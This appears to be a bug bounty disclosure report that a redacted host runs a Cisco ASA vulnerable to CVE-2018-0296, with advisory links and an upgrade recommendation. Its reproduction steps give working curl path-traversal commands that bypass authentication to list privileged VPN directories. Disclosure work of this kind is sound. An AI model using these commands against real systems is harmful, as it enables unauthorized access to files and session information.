  "content": "\nSummary:\nhttps://\u2588\u2588\u2588\u2588\u2588 is an ASA running software vulnerable to CVE-2018-0296 which allows a remote attacker to exploit a path traversal vulnerability and bypass authentication to sensitive files. The attacker can use this to enumerate the ASA VPN web directory structure and exploit privileged access to the system to gain access to session information.\nStep-by-step Reproduction Instructions\nYou can exploit with cURL or Burp: curl -vk -m 45 --path-as-is https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/+CSCOU+/../+CSCOE+/files/file_list.json\nYou can alter the command slightly to pull additional directory information: curl -vk -m 45 --path-as-is https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b to dig into these privileged directories.\nI also pushed a request to repeater to do this in Burp for screenshots.\nProduct, Version, and Configuration (If applicable) https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180606-asaftd https://nvd.nist.gov/vuln/detail/CVE-2018-0296\nSuggested Mitigation/Remediation Actions\nUpgrade the ASA software version per the referenced advisory.\nImpact\nHigh - This vulnerability allows the attacker to browse files past the authentication and disclose sensitive information.\n\n",
